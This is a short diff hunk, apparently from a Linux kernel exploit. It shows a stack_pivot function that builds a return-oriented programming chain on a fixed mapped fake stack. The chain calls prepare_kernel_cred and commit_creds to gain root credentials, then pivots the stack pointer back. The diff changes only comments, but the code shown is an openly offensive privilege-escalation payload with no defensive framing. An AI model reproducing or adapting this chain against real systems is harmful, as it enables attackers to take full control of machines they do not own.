@@ -42,12 +42,12 @@ void stack_pivot() {
                     MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
   unsigned off = 0x1000 / 8;
   fake_stack[0] = 0x0deadfULL;
-  fake_stack[off++] = pop_rdi; // pop rdi; ret;
+  fake_stack[off++] = pop_rdi;
   fake_stack[off++] = 0x0;
   fake_stack[off++] = prepare_kernel_cred;
   fake_stack[off++] = commit_creds;
-  fake_stack[off++] = pop_rsp;               // pop rsp; ret;
-  fake_stack[off++] = 0xffffc900001bff08ULL; // RSP
+  fake_stack[off++] = pop_rsp;
+  fake_stack[off++] = 0xffffc900001bff08ULL; /* old RSP */
 }
 
 int main() {
